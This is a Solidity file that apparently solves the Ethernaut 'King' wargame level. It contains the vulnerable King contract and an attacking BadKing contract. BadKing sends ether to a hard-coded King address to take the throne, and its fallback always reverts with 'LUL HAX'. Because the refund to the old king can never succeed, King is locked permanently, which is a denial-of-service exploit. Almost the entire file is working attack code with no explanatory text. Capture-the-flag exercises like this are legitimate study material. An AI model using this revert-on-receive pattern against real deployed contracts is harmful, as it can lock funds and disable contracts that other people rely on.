// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadKing {
    King king = King(payable(0xDe98b2D231843306CB4817FB9316452FEB45Ad5B));

    constructor() payable {

    }

    fallback() external {
        revert("LUL HAX");
    }

    function becomeKing() public {
        (bool success, ) = address(king).call{value: address(this).balance}("");
        require(success, "'FAIL!'");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}